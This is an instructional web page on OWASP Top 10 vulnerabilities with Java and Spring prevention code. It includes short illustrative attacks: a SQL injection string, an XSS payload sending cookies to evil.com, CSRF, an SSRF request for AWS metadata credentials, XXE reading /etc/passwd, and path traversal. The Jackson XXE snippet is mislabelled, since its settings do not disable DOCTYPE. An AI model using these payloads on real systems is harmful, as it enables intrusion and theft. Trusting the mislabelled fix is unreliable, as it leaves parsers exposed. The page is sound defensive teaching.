---
title: Web Attacks (OWASP Top 10)
description: OWASP Top 10 web vulnerabilities — how each attack works and how to prevent them in Java and Spring applications
category: security
pageClass: layout-security
difficulty: intermediate
tags: [owasp, xss, csrf, sql-injection, ssrf, idor, xxe, security]
related:
  - /security/secure-coding
  - /spring/spring-security
  - /databases/sql
estimatedMinutes: 35
---

# Web Attacks (OWASP Top 10)

<DifficultyBadge level="intermediate" />

The OWASP Top 10 is the industry-standard list of the most critical web application security risks. Every Java/Spring developer should understand each attack: how it works, what it looks like in code, and how to prevent it.

---

## 1. Injection (SQL Injection)

### How It Works
User input is interpreted as code by an interpreter (SQL engine, LDAP, OS shell). The attacker manipulates a query by injecting SQL syntax.

**Vulnerable code:**
```java
// NEVER do this
String query = "SELECT * FROM users WHERE username = '" + username + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

If `username = "admin' OR '1'='1"` the query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
-- Returns ALL rows!
```

### Prevention
```java
// 1. Parameterised statements (JDBC)
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?");
ps.setString(1, username);

// 2. Spring Data JPA — safe by default
@Query("SELECT u FROM User u WHERE u.username = :username")
Optional<User> findByUsername(@Param("username") String username);

// 3. Native queries still need parameterisation
@Query(value = "SELECT * FROM users WHERE username = :username", nativeQuery = true)
Optional<User> findByUsernameNative(@Param("username") String username);
```

::: danger Never
Concatenate user input into SQL strings. This applies to JPQL too — use `:param` syntax.
:::

---

## 2. Broken Authentication

### How It Works
Weak passwords, predictable session tokens, credentials in URLs, or failure to invalidate sessions after logout.

### Prevention
```java
// BCrypt password hashing (Spring Security)
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12); // cost factor 12
}

// Argon2 (preferred for new systems)
@Bean
public PasswordEncoder passwordEncoder() {
    return new Argon2PasswordEncoder(
        16,   // saltLength
        32,   // hashLength
        1,    // parallelism
        65536, // memory (KB)
        3     // iterations
    );
}
```

Key practices:
- Minimum 12-character passwords, enforce complexity
- Rate-limit login attempts (lock after N failures)
- Invalidate session tokens on logout
- Use `HttpOnly` + `Secure` + `SameSite=Strict` cookies
- MFA for sensitive operations

---

## 3. Cross-Site Scripting (XSS)

### How It Works
Attacker injects malicious JavaScript into a page that executes in victims' browsers. Three types:

| Type | Description |
|------|-------------|
| **Stored (Persistent)** | Injected script saved in DB, served to all users |
| **Reflected** | Script in URL parameter, reflected in response |
| **DOM-based** | JavaScript reads attacker-controlled source (URL hash) and writes to DOM |

**Example attack vector:**
```
GET /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

### Prevention
```java
// 1. Output encoding — escape HTML entities
import org.springframework.web.util.HtmlUtils;

String safe = HtmlUtils.htmlEscape(userInput);

// 2. Thymeleaf auto-escapes by default
// th:text escapes; th:utext does NOT (avoid th:utext with user data)
<p th:text="${userComment}">...</p>

// 3. Content Security Policy header
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .policyDirectives("default-src 'self'; script-src 'self'; object-src 'none'")
    )
);
```

::: tip Key rule
**Never** render user-controlled content as raw HTML without sanitisation. Use a library like OWASP Java HTML Sanitizer for rich text.
:::

---

## 4. Insecure Direct Object References (IDOR)

### How It Works
Attacker guesses or enumerates resource IDs to access other users' data.

```
GET /api/invoices/1001   → your invoice (OK)
GET /api/invoices/1002   → someone else's invoice (IDOR!)
```

### Prevention
```java
// Always verify ownership
@GetMapping("/api/invoices/{id}")
public Invoice getInvoice(@PathVariable Long id,
                          @AuthenticationPrincipal UserDetails user) {
    Invoice invoice = invoiceRepository.findById(id)
        .orElseThrow(() -> new NotFoundException());

    // Authorisation check
    if (!invoice.getOwnerUsername().equals(user.getUsername())) {
        throw new AccessDeniedException("Not your invoice");
    }
    return invoice;
}

// OR: query filters to user's own data
@Query("SELECT i FROM Invoice i WHERE i.id = :id AND i.owner.username = :username")
Optional<Invoice> findByIdAndOwner(@Param("id") Long id, @Param("username") String username);
```

Use **UUIDs** instead of sequential IDs to make enumeration harder (security through obscurity — not sufficient alone, but helpful).

---

## 5. Security Misconfiguration

### How It Works
Default credentials, verbose error messages, open admin endpoints, unnecessary features enabled.

### Prevention
```java
// Hide stack traces in production
@ControllerAdvice
public class GlobalExceptionHandler {
    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> handleException(Exception ex) {
        log.error("Internal error", ex); // log full stack trace
        return ResponseEntity.status(500)
            .body(new ErrorResponse("Internal server error")); // generic message to client
    }
}
```

Checklist:
- Remove default admin accounts and passwords
- Disable unused HTTP methods
- Set security headers (see [TLS/SSL page](/security/tls-ssl))
- Never expose `/actuator` endpoints publicly without auth
- Rotate secrets and API keys regularly

---

## 6. Vulnerable and Outdated Components

### How It Works
Using libraries with known CVEs (Common Vulnerabilities and Exposures).

### Prevention
```xml
<!-- Maven: OWASP dependency check plugin -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.9</version>
    <executions>
        <execution>
            <goals><goal>check</goal></goals>
        </execution>
    </executions>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS> <!-- fail on high severity -->
    </configuration>
</plugin>
```

Also use:
- **GitHub Dependabot** — automated PRs for vulnerable dependencies
- **Snyk** — developer-friendly vulnerability scanning
- Keep a Software Bill of Materials (SBOM)

---

## 7. Cross-Site Request Forgery (CSRF)

### How It Works
Attacker tricks an authenticated user's browser into making an unintended request to your app.

```html
<!-- Malicious page visited by logged-in user -->
<img src="https://yourbank.com/transfer?to=attacker&amount=10000" />
<!-- Browser sends cookies automatically! -->
```

### Prevention
```java
// Option 1: CSRF tokens (Spring Security default for form-based apps)
// Spring Security auto-generates and validates _csrf token in forms

// Option 2: Disable CSRF for stateless REST APIs using JWT
// (JWT in Authorization header is not sent automatically by browsers)
http.csrf(AbstractHttpConfigurer::disable);

// Option 3: SameSite cookie attribute
// Prevents cookies from being sent in cross-site requests
@Bean
public CookieSameSiteSupplier applicationCookieSameSiteSupplier() {
    return CookieSameSiteSupplier.ofStrict();
}
```

::: tip When to disable CSRF
Safe to disable when: API is **stateless** (no session cookies) and uses **JWT in Authorization header**. If you use session cookies — keep CSRF protection enabled.
:::

---

## 8. Server-Side Request Forgery (SSRF)

### How It Works
Attacker provides a URL that causes the server to make requests to internal services (metadata APIs, databases, internal APIs).

```
POST /fetch-image
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
// Fetches AWS metadata → exposes credentials!
```

### Prevention
```java
// Validate and allowlist URLs
public void fetchExternalResource(String url) {
    URI uri = URI.create(url);

    // Block private IP ranges
    InetAddress address = InetAddress.getByName(uri.getHost());
    if (address.isSiteLocalAddress() || address.isLoopbackAddress()
            || address.isLinkLocalAddress()) {
        throw new SecurityException("Internal addresses are not allowed");
    }

    // Allowlist of permitted hostnames
    Set<String> allowedHosts = Set.of("api.trusted.com", "cdn.example.com");
    if (!allowedHosts.contains(uri.getHost())) {
        throw new SecurityException("Host not in allowlist: " + uri.getHost());
    }
}
```

---

## 9. XML External Entity (XXE)

### How It Works
XML parser processes external entity references that read files or make network requests.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<request><data>&xxe;</data></request>
<!-- Server returns /etc/passwd content! -->
```

### Prevention
```java
// Disable DOCTYPE declarations in Jackson XML
XmlMapper xmlMapper = XmlMapper.builder()
    .disable(MapperFeature.CAN_OVERRIDE_ACCESS_MODIFIERS)
    .configure(FromXmlParser.Feature.EMPTY_ELEMENT_AS_NULL, false)
    .build();

// For JAXB / SAX parser
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

Use JSON instead of XML wherever possible — XXE is not possible with JSON.

---

## 10. Path Traversal

### How It Works
Attacker manipulates file paths to access files outside the intended directory.

```
GET /files?name=../../../../etc/passwd
```

### Prevention
```java
public Path resolveFilePath(String fileName) throws IOException {
    Path baseDir = Paths.get("/app/uploads").toRealPath();
    Path resolved = baseDir.resolve(fileName).normalize().toRealPath();

    // Ensure resolved path is still under baseDir
    if (!resolved.startsWith(baseDir)) {
        throw new SecurityException("Path traversal attempt detected: " + fileName);
    }
    return resolved;
}
```

---

## OWASP Top 10 Quick Reference (2021)

| # | Risk | Java/Spring Mitigation |
|---|------|----------------------|
| A01 | Broken Access Control | IDOR checks, `@PreAuthorize`, ownership queries |
| A02 | Cryptographic Failures | BCrypt/Argon2 passwords, TLS, encrypt sensitive data at rest |
| A03 | Injection | PreparedStatement, JPA `@Query` with params |
| A04 | Insecure Design | Threat modelling, secure design patterns |
| A05 | Security Misconfiguration | Disable defaults, generic error messages, security headers |
| A06 | Vulnerable Components | OWASP Dependency-Check, Snyk, Dependabot |
| A07 | Auth & Session Failures | BCrypt, rate limiting, HttpOnly cookies, MFA |
| A08 | Software & Data Integrity | Dependency verification, signed JARs |
| A09 | Security Logging Failures | Audit logs, don't log sensitive data |
| A10 | SSRF | URL allowlists, block private IP ranges |

<RelatedTopics :topics="['/security/secure-coding', '/security/cryptography', '/spring/spring-security']" />

[→ Back to Security Overview](/security/)
